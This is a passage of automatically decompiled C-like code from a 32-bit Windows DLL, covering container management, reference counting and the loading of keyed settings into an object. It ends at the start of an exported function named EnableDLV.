  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    sub_10002C25((int *)(this[3] + 8 * i - 4), (int *)(this[3] + 8 * i + 4));
  result = sub_10002C25((int *)(a2 + 4), (int *)(this[3] + 8 * a3 + 4));
  ++this[1];
  return result;
}

//----- (10002DD6) --------------------------------------------------------
int __thiscall sub_10002DD6(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10002DEE) --------------------------------------------------------
int __thiscall sub_10002DEE(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B8782);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_10002C25((int *)(this[3] + 8 * v2 + 12), (int *)(this[3] + 8 * v2 + 4));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10002C25(&dword_100BF9C8, (int *)(this[3] + 8 * v4 + 4));
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BF9C8: using guessed type int dword_100BF9C8;

//----- (10002E4B) --------------------------------------------------------
int __thiscall sub_10002E4B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B8783);
  return this[3] + 8 * a2;
}

//----- (10002E69) --------------------------------------------------------
int __thiscall sub_10002E69(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B8842);
  return this[3] + 8 * a2;
}

//----- (10002E87) --------------------------------------------------------
void __thiscall sub_10002E87(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j__free(v2 - 1);
    }
  }
}

//----- (10002EBF) --------------------------------------------------------
int __thiscall sub_10002EBF(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // edx
  int result; // eax

  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10002EF8) --------------------------------------------------------
BOOL __thiscall sub_10002EF8(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10002F03) --------------------------------------------------------
int __thiscall sub_10002F03(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_10002C25(&dword_100BF9C8, (int *)(this[3] + 8 * i + 4));
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BF9C8: using guessed type int dword_100BF9C8;

//----- (10002F4E) --------------------------------------------------------
unsigned int __thiscall sub_10002F4E(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B8843);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10002FC0) --------------------------------------------------------
unsigned int __thiscall sub_10002FC0(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10002FE8) --------------------------------------------------------
unsigned int __stdcall sub_10002FE8(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10002FF9) --------------------------------------------------------
unsigned int __thiscall sub_10002FF9(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int *Blocka; // [esp+28h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      8u,
      v5,
      (void (__thiscall *)(void *))sub_1000332D,
      (void (__thiscall *)(void *))sub_1000CE59);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    Blocka = (int *)(a3 + 4);
    do
    {
      sub_10002C25(Blocka, (int *)(this[3] + 8 * v10 + 4));
      Blocka += 2;
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (100030B0) --------------------------------------------------------
void *__thiscall sub_100030B0(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  char *v7; // edi
  int v8; // ecx
  int *v9; // eax
  _DWORD *v10; // ebx
  char *v11; // eax
  int *v12; // edi
  char *v13; // [esp+Ch] [ebp-18h]
  unsigned int v14; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]

  result = &loc_1007F4C6;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v15 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v15 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v7 = (char *)this[3];
      v13 = v7;
      v8 = (unsigned __int64)(unsigned int)v15 >> 29 != 0 ? -1 : 8 * v15;
      v9 = (int *)operator new(__CFADD__(v8, 4) ? -1 : v8 + 4);
      if ( v9 )
      {
        *v9 = v15;
        v10 = v9 + 1;
        `eh vector constructor iterator'(
          v9 + 1,
          8u,
          v15,
          (void (__thiscall *)(void *))sub_1000332D,
          (void (__thiscall *)(void *))sub_1000CE59);
      }
      else
      {
        v10 = 0;
      }
      v14 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v11 = (char *)(v7 - (char *)v10);
        v12 = v10 + 1;
        while ( 1 )
        {
          sub_10002C25((int *)&v11[(_DWORD)v12], v12);
          ++v14;
          v12 += 2;
          if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
          v11 = (char *)(v13 - (char *)v10);
        }
        v7 = v13;
      }
      this[3] = v10;
      if ( v7 )
      {
        if ( *((_DWORD *)v7 - 1) )
          (**(void (__thiscall ***)(char *, int))v7)(v7, 3);
        else
          j__free(v7 - 4);
      }
      result = (void *)v15;
      this[2] = v15;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (100031D1) --------------------------------------------------------
int __userpurge sub_100031D1@<eax>(__int32 a1@<eax>, int a2)
{
  sub_10003457(a1);
  return a2;
}

//----- (100031F7) --------------------------------------------------------
_DWORD *__userpurge sub_100031F7@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000323B) --------------------------------------------------------
void __thiscall sub_1000323B(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000352A((int)this);
}

//----- (1000328E) --------------------------------------------------------
_DWORD *__userpurge sub_1000328E@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100032D2) --------------------------------------------------------
void __thiscall sub_100032D2(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003564((int)this);
}

//----- (10003311) --------------------------------------------------------
_DWORD *__thiscall sub_10003311(_DWORD *Block, char a2)
{
  sub_10002CF0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000332D) --------------------------------------------------------
_DWORD *__thiscall sub_1000332D(_DWORD *this)
{
  return sub_1000CC20(this, word_100BBCC4);
}
// 100BBCC4: using guessed type wchar_t word_100BBCC4[2];

//----- (10003339) --------------------------------------------------------
char *__usercall sub_10003339@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_1000341E);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (10003357) --------------------------------------------------------
_DWORD *__stdcall sub_10003357(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10092FB4;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10092FB4: using guessed type int (__thiscall *off_10092FB4)(void *Block, char);

//----- (10003386) --------------------------------------------------------
LONG __usercall sub_10003386@<eax>(int *a1@<esi>)
{
  LONG result; // eax
  void *v2; // eax
  int v3; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) )
    {
      v2 = operator new(0x24u);
      if ( v2 )
        v3 = sub_1000C971((int)v2, *a1);
      else
        v3 = 0;
      *a1 = v3;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100033DA) --------------------------------------------------------
_DWORD *__userpurge sub_100033DA@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000341E) --------------------------------------------------------
void __thiscall sub_1000341E(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003597((int)this);
}

//----- (10003457) --------------------------------------------------------
int __usercall sub_10003457@<eax>(__int32 a1@<eax>)
{
  int v1; // ecx
  int result; // eax
  _DWORD *v3; // eax
  int v4; // ecx
  int v5; // [esp-8h] [ebp-30h] BYREF
  int v6; // [esp-4h] [ebp-2Ch]
  void *Block[2]; // [esp+8h] [ebp-20h] BYREF
  _DWORD v8[3]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  v1 = dword_100BBCC8;
  result = _InterlockedExchange((volatile __int32 *)Block, a1);
  if ( !v1 )
  {
    sub_100171BE(dword_100BF9E4, v8);
    v9 = 0;
    if ( !dword_100BBCC8 )
    {
      v3 = operator new(0x2Cu);
      Block[0] = v3;
      LOBYTE(v9) = 1;
      if ( v3 )
      {
        v5 = v6;
        Block[1] = &v5;
        sub_1000CE26(&v5, (int)&unk_100BF608);
        LOBYTE(v9) = 1;
        v3 = sub_100035EA((_DWORD *)Block[0], v5, v6);
        v4 = (int)v3;
      }
      else
      {
        v4 = 0;
      }
      LOBYTE(v9) = 0;
      _InterlockedExchange((volatile __int32 *)Block, (__int32)v3);
      dword_100BBCC8 = v4;
      dword_100BC734 = v4;
    }
    v9 = -1;
    return sub_100171F2(v8);
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BBCC8: using guessed type int dword_100BBCC8;
// 100BC734: using guessed type int dword_100BC734;
// 100BF9E4: using guessed type int dword_100BF9E4[9];
// 10003457: using guessed type _DWORD var_18[3];

//----- (1000352A) --------------------------------------------------------
void __usercall sub_1000352A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003564) --------------------------------------------------------
void __usercall sub_10003564(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003597) --------------------------------------------------------
void __usercall sub_10003597(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100035EA) --------------------------------------------------------
_DWORD *__stdcall sub_100035EA(_DWORD *a1, int a2, int a3)
{
  volatile LONG *v3; // ecx
  _DWORD *v4; // eax
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  volatile LONG *v10; // ecx
  _DWORD *v11; // eax
  int v12; // ebx
  void *v13; // eax
  volatile LONG *v14; // ecx
  volatile LONG *v15; // ecx
  _DWORD *v16; // eax
  unsigned int v17; // eax
  _DWORD *v18; // eax
  int v19; // eax
  void *v20; // eax
  volatile LONG *v21; // ecx
  volatile LONG *v22; // ecx
  _DWORD *v23; // eax
  unsigned int v24; // eax
  _DWORD *v25; // eax
  int v26; // eax
  volatile LONG *v28; // [esp-2Ch] [ebp-10Ch] BYREF
  volatile LONG *v29; // [esp-28h] [ebp-108h] BYREF
  volatile LONG *v30; // [esp-24h] [ebp-104h] BYREF
  volatile LONG *v31; // [esp-20h] [ebp-100h] BYREF
  volatile LONG *v32; // [esp-1Ch] [ebp-FCh]
  volatile LONG *v33; // [esp-Ch] [ebp-ECh] BYREF
  volatile LONG *v34; // [esp-8h] [ebp-E8h]
  int v35; // [esp-4h] [ebp-E4h] BYREF
  int v36; // [esp+0h] [ebp-E0h]
  volatile LONG *v37; // [esp+4h] [ebp-DCh] BYREF
  volatile LONG *v38; // [esp+8h] [ebp-D8h]
  int v39; // [esp+Ch] [ebp-D4h] BYREF
  int v40[18]; // [esp+18h] [ebp-C8h] BYREF
  _DWORD v41[12]; // [esp+60h] [ebp-80h] BYREF
  int v42[5]; // [esp+90h] [ebp-50h] BYREF
  int v43[2]; // [esp+A4h] [ebp-3Ch] BYREF
  int v44[2]; // [esp+ACh] [ebp-34h] BYREF
  int v45; // [esp+B4h] [ebp-2Ch] BYREF
  void *Block; // [esp+B8h] [ebp-28h]
  int v47; // [esp+BCh] [ebp-24h] BYREF
  volatile LONG **v48; // [esp+C0h] [ebp-20h]
  char *i; // [esp+C4h] [ebp-1Ch]
  char *j; // [esp+C8h] [ebp-18h]
  void *v51; // [esp+CCh] [ebp-14h]
  int *v52; // [esp+D0h] [ebp-10h]
  int v53; // [esp+DCh] [ebp-4h]

  v52 = &v39;
  v53 = 0;
  sub_10001AD6(dword_100BC5A4, a1);
  LOBYTE(v53) = 2;
  v38 = v3;
  v37 = v3;
  v51 = &v37;
  sub_10014512(&v37);
  LOBYTE(v53) = 3;
  v4 = sub_10012A7C(v44, (int)&unk_100BF608);
  LOBYTE(v53) = 4;
  v5 = sub_10012BA7((int)v4);
  v36 = v6;
  v35 = v6;
  Block = &v35;
  sub_1000CE26(&v35, v5);
  LOBYTE(v53) = 6;
  sub_10013A6C(&dword_10092E7C, (int)v40, (void *)1, 1, v35, v36, (int)v37, v38);
  LOBYTE(v53) = 8;
  sub_10012AAC(v44);
  sub_100180D4(v41, (int)v40);
  LOBYTE(v53) = 9;
  v7 = sub_10018133((int)v41);
  (*(void (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)v7 + 8))(v7, 0, 0);
  v8 = operator new(0x60u);
  Block = v8;
  LOBYTE(v53) = 10;
  if ( v8 )
    v9 = sub_10018A96((int)v41, v8);
  else
    v9 = 0;
  LOBYTE(v53) = 9;
  sub_10003BC8(v44, (int)v9);
  LOBYTE(v53) = 11;
  v51 = operator new(0x24u);
  LOBYTE(v53) = 12;
  if ( v51 )
  {
    v35 = v36;
    Block = &v35;
    sub_1000CE26(&v35, (int)&unk_100BF5E8);
    LOBYTE(v53) = 13;
    v34 = v10;
    v33 = v10;
    v48 = &v33;
    sub_10003BB4(v44, &v33);
    LOBYTE(v53) = 12;
    v11 = sub_10018255(v51, (int)v33, v34, v35, v36);
  }
  else
  {
    v11 = 0;
  }
  LOBYTE(v53) = 11;
  sub_10003BC8(v43, (int)v11);
  LOBYTE(v53) = 15;
  v12 = v43[0];
  if ( (*(unsigned __int8 (__thiscall **)(int, void *))(*(_DWORD *)v43[0] + 88))(v43[0], &unk_100BF5F8) )
    a1[1] = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v12 + 64))(v12, &unk_100BF5F8);
  if ( (*(unsigned __int8 (__thiscall **)(int, void *))(*(_DWORD *)v12 + 88))(v12, &unk_100BF5F0) )
    *a1 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v12 + 64))(v12, &unk_100BF5F0);
  if ( (*(unsigned __int8 (__thiscall **)(int, void *))(*(_DWORD *)v12 + 88))(v12, &unk_100BF5C8) )
    a1[2] = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v12 + 64))(v12, &unk_100BF5C8);
  if ( (*(unsigned __int8 (__thiscall **)(int, void *))(*(_DWORD *)v12 + 88))(v12, &unk_100BF5D0) )
  {
    v13 = operator new(0x24u);
    v14 = v32;
    v51 = v13;
    LOBYTE(v53) = 16;
    if ( v13 )
    {
      v31 = v32;
      v48 = &v31;
      sub_1000CE26(&v31, (int)&unk_100BF5D0);
      LOBYTE(v53) = 17;
      v30 = v15;
      v29 = v15;
      Block = &v29;
      sub_10003BB4(v43, &v29);
      LOBYTE(v53) = 16;
      v16 = sub_10018255(v51, (int)v29, v30, (int)v31, (int)v32);
    }
    else
    {
      v16 = 0;
    }
    LOBYTE(v53) = 15;
    v32 = v14;
    v31 = v14;
    v48 = &v31;
    sub_10003BC8(&v31, (int)v16);
    LOBYTE(v53) = 15;
    sub_10019F0D((int)v42, (int)v31, v32);
    LOBYTE(v53) = 20;
    (*(void (__thiscall **)(_DWORD *))(a1[3] + 52))(a1 + 3);
    for ( i = 0; ; ++i )
    {
      v17 = sub_10019FC2((int)v42);
      if ( (unsigned int)i >= v17 )
        break;
      v18 = sub_1001A093(v42, &v45, i);
      LOBYTE(v53) = 21;
      v19 = (*(int (__thiscall **)(_DWORD, int *, void *))(*(_DWORD *)*v18 + 76))(*v18, &v47, &unk_100BF600);
      LOBYTE(v53) = 22;
      (*(void (__thiscall **)(_DWORD *, int))(a1[3] + 36))(a1 + 3, v19);
      LOBYTE(v53) = 21;
      sub_1000CE59(&v47);
      LOBYTE(v53) = 20;
      sub_10003C0C(&v45);
    }
    LOBYTE(v53) = 15;
    sub_10003A8D(v42);
  }
  if ( (*(unsigned __int8 (__thiscall **)(int, void *))(*(_DWORD *)v12 + 88))(v12, &unk_100BF5E0) )
  {
    v20 = operator new(0x24u);
    v21 = v31;
    v51 = v20;
    LOBYTE(v53) = 23;
    if ( v20 )
    {
      v30 = v31;
      v48 = &v30;
      sub_1000CE26(&v30, (int)&unk_100BF5E0);
      LOBYTE(v53) = 24;
      v29 = v22;
      v28 = v22;
      Block = &v28;
      sub_10003BB4(v43, &v28);
      LOBYTE(v53) = 23;
      v23 = sub_10018255(v51, (int)v28, v29, (int)v30, (int)v31);
    }
    else
    {
      v23 = 0;
    }
    LOBYTE(v53) = 15;
    v31 = v21;
    v30 = v21;
    v48 = &v30;
    sub_10003BC8(&v30, (int)v23);
    LOBYTE(v53) = 15;
    sub_10019F0D((int)v42, (int)v30, v31);
    LOBYTE(v53) = 27;
    (*(void (__thiscall **)(_DWORD *))(a1[7] + 52))(a1 + 7);
    for ( j = 0; ; ++j )
    {
      v24 = sub_10019FC2((int)v42);
      if ( (unsigned int)j >= v24 )
        break;
      v25 = sub_1001A093(v42, &v45, j);
      LOBYTE(v53) = 28;
      v26 = (*(int (__thiscall **)(_DWORD, int *, void *))(*(_DWORD *)*v25 + 76))(*v25, &v47, &unk_100BF5D8);
      LOBYTE(v53) = 29;
      (*(void (__thiscall **)(_DWORD *, int))(a1[7] + 36))(a1 + 7, v26);
      LOBYTE(v53) = 28;
      sub_1000CE59(&v47);
      LOBYTE(v53) = 27;
      sub_10003C0C(&v45);
    }
    LOBYTE(v53) = 15;
    sub_10003A8D(v42);
  }
  LOBYTE(v53) = 11;
  sub_10003C0C(v43);
  LOBYTE(v53) = 9;
  sub_10003C0C(v44);
  LOBYTE(v53) = 8;
  sub_10003A3D(v41);
  LOBYTE(v53) = 2;
  sub_100039E1(v40);
  v53 = -1;
  sub_1000CE59(&a2);
  return a1;
}
// 1000361B: variable 'v3' is possibly undefined
// 10003647: variable 'v6' is possibly undefined
// 100036FD: variable 'v10' is possibly undefined
// 100037C0: variable 'v15' is possibly undefined
// 100037E7: variable 'v14' is possibly undefined
// 100038B7: variable 'v22' is possibly undefined
// 100038DE: variable 'v21' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10092E7C: using guessed type int dword_10092E7C;
// 100BC5A4: using guessed type _DWORD dword_100BC5A4[3];
// 100035EA: using guessed type int var_C8[18];
// 100035EA: using guessed type _DWORD var_80[12];
// 100035EA: using guessed type int var_50[5];

//----- (100039E1) --------------------------------------------------------
LONG __stdcall sub_100039E1(int *a1)
{
  sub_10003B7B(a1 + 10);
  sub_10003B42(a1 + 8);
  sub_10003B09(a1 + 6);
  sub_100015D8(a1 + 3);
  return sub_1000CE59(a1 + 1);
}

//----- (10003A3D) --------------------------------------------------------
void __stdcall sub_10003A3D(_DWORD *a1)
{
  sub_1001A6CB(a1 + 10);
  sub_1001A7CF(a1 + 8);
  sub_10003B7B(a1 + 4);
  sub_10003B42(a1 + 2);
}

//----- (10003A8D) --------------------------------------------------------
void __stdcall sub_10003A8D(_DWORD *a1)
{
  sub_10003C0C(a1 + 3);
  *a1 = &off_10093D34;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);

//----- (10003AC0) --------------------------------------------------------
_DWORD *__stdcall sub_10003AC0(_DWORD *a1, unsigned int a2)
{
  unsigned int v2; // esi

  sub_10003357(a1);
  v2 = 1;
  for ( *a1 = &off_10092F38; v2 < a2; v2 *= 2 )
    ;
  sub_10003C48(a1, v2);
  return a1;
}
// 10092F38: using guessed type int (__thiscall *off_10092F38)(void *Block, char);

//----- (10003B09) --------------------------------------------------------
void __thiscall sub_10003B09(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003CB5((int)this);
}

//----- (10003B42) --------------------------------------------------------
void __thiscall sub_10003B42(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003CDD((int)this);
}

//----- (10003B7B) --------------------------------------------------------
void __thiscall sub_10003B7B(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003D05((int)this);
}

//----- (10003BB4) --------------------------------------------------------
_DWORD *__usercall sub_10003BB4@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10003BC8) --------------------------------------------------------
_DWORD *__userpurge sub_10003BC8@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10003C0C) --------------------------------------------------------
void __thiscall sub_10003C0C(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003D3F((int)this);
}

//----- (10003C48) --------------------------------------------------------
void __usercall sub_10003C48(_DWORD *a1@<edi>, unsigned int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(
      v4 + 1,
      8u,
      a2,
      (void (__thiscall *)(void *))sub_1000332D,
      (void (__thiscall *)(void *))sub_1000CE59);
  }
  a1[3] = v2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10003CB5) --------------------------------------------------------
void __usercall sub_10003CB5(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003CDD) --------------------------------------------------------
void __usercall sub_10003CDD(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003D05) --------------------------------------------------------
void __usercall sub_10003D05(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003D3F) --------------------------------------------------------
void __usercall sub_10003D3F(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003D71) --------------------------------------------------------
int __cdecl EnableDLV(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v3; // [esp+0h] [ebp-3Ch] BYREF
